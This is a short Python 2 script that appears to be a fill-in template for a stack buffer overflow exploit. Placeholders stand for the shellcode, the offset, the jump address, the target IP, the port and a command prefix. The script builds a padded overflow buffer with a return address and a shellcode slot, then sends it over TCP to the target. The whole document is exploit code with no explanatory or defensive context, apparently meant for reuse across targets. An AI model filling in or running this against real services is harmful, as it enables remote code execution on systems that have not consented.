#!/usr/bin/python
import socket, sys

WAIT_FOR_REPLACE_SHELL_FILE

buffer = "A" * WAIT_FOR_REPLACE_OFFSET + "WAIT_FOR_REPLACE_JMP_ADDRESS" + "\x09" * 32 + buf

while True:
    try:  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('WAIT_FOR_REPLACE_IP', WAIT_FOR_REPLACE_PORT))
        s.send(('WAIT_FOR_REPLACE_PREFIX/.:/' + buffer))
        s.close()

    except:
        print "Error connecting to server"
        sys.exit()
